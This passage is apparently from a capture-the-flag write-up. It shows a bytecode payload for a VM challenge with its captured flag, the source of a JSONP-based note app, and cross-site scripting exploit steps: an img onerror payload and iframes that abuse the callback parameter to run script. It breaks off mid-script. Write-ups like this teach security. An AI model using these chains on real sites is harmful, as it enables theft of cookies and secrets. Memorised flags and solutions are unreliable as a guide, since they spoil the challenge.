+    payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> size  <span class="token comment"># push(size) -> R3</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x03\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R3), pop(R2), pop(R1), pop(R0)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
+    <span class="token keyword">return</span> payload
+
+
+size <span class="token operator">=</span> <span class="token number">45</span>
+payload <span class="token operator">=</span> store<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> read<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> output<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing</span>
+
+<span class="token comment"># idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}</span>
+14:T62b,const express = require("express");
+const path = require("path");
+const crypto = require("crypto");
+const cookieParser = require("cookie-parser");
+const app = express();
+
+app.use(express.json());
+app.set("view engine", "ejs");
+app.set("views", path.join(__dirname, "views"));
+app.use(express.static("public"));
+app.use(cookieParser());
+
+const get_id = () => crypto.randomBytes(16).toString("hex");
+
+const notes = new Map;
+
+/* post a note */
+app.post("/api/post", (req, res) => {
+    const {
+        noteTitle,
+        noteContent
+    } = req.body;
+    if (!noteTitle || typeof noteTitle !== "string" || !noteContent || typeof noteContent !== "string") {
+        return res.status(400).json({
+            message: "invalid note"
+        });
+    }
+    const id = get_id();
+    notes.set(id, {
+        noteTitle,
+        noteContent
+    });
+    return res.json({
+        id
+    });
+});
+
+/* retrieve a note */
+app.get("/api/view/:note", (req, res) => {
+    return res.jsonp(notes.get(req.params.note));
+});
+
+/* retrieve the flag */
+app.get("/api/flag", (req, res) => {
+    if (req.cookies.secret === process.env.SECRET) {
+        return res.json({
+            flag: process.env.FLAG
+        });
+    } else {
+        return res.json({
+            error: "unauthorized"
+        });
+    }
+});
+
+/* view a note */
+app.get("/note/:id", (req, res) => {
+    return res.render("notes", {
+        note: req.params.id
+    });
+});
+
+/* index */
+app.use("*path", (req, res) => {
+    return res.render("index");
+});
+
+app.listen(process.env.PORT || 1337, () => {
+    console.log("listening...")
+});
+15:T3773,<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"crypto"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"cookie-parser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"view engine"</span><span class="token punctuation">,</span> <span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"views"</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"views"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">"public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">get_id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> notes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* post a note */</span>
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/post"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> <span class="token punctuation">{</span>
+        noteTitle<span class="token punctuation">,</span>
+        noteContent
+    <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>noteTitle <span class="token operator">||</span> <span class="token keyword">typeof</span> noteTitle <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token operator">!</span>noteContent <span class="token operator">||</span> <span class="token keyword">typeof</span> noteContent <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"invalid note"</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">get_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        noteTitle<span class="token punctuation">,</span>
+        noteContent
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+        id
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* retrieve a note */</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/view/:note"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">jsonp</span><span class="token punctuation">(</span>notes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>note<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* retrieve the flag */</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>secret <span class="token operator">===</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">SECRET</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token literal-property property">flag</span><span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">"unauthorized"</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* view a note */</span>
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/note/:id"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"notes"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">note</span><span class="token operator">:</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">/* index */</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"*path"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">1337</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listening..."</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+16:T2223,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.7.1.js<span class="token punctuation">"</span></span>
+        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Post a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>JNote<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Post<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+17:T182d,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>
+        <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.7.1.js<span class="token punctuation">"</span></span>
+        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/view.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">defer</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/api/view/&lt;%= note %>?callback=showNote<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteElement<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteTitle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>noteContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+18:T60e,<span class="token keyword">function</span> <span class="token function">showNote</span><span class="token punctuation">(</span><span class="token parameter">note</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    titleElement <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#noteTitle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    contentElement <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#noteContent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    titleElement<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span><span class="token string">"noteTitle"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    contentElement<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>note<span class="token punctuation">[</span><span class="token string">"noteContent"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+19:Te3f,jQuery<span class="token punctuation">.</span><span class="token function-variable function">_evalUrl</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> options<span class="token punctuation">,</span> doc</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> jQuery<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+        <span class="token literal-property property">url</span><span class="token operator">:</span> url<span class="token punctuation">,</span>
+
+        <span class="token comment">// Make this explicit, since user can override this through ajaxSetup (trac-11264)</span>
+        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">"script"</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">async</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">global</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+
+        <span class="token comment">// Only evaluate the response if it is successful (gh-4126)</span>
+        <span class="token comment">// dataFilter is not invoked for failure responses, so using it instead</span>
+        <span class="token comment">// of the default converter is kludgy but it works.</span>
+        <span class="token literal-property property">converters</span><span class="token operator">:</span> <span class="token punctuation">{</span>
+            <span class="token string-property property">"text script"</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span>
+        <span class="token function-variable function">dataFilter</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            jQuery<span class="token punctuation">.</span><span class="token function">globalEval</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> options<span class="token punctuation">,</span> doc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+1b:T4d9,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
+    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+1c:T44f,payload <span class="token operator">=</span> <span class="token string">"&lt;img src=x onerror='alert(0)'>"</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">"/api/post"</span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"noteContent"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"noteTitle"</span><span class="token punctuation">:</span> <span class="token string">"anything"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+note_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+1d:Tefe,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> iframe2 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iframe2<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23"</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> iframe3 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        iframe3<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23"</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe3<span class="token punctuation">)</span><span class="token punctuation">;</span>
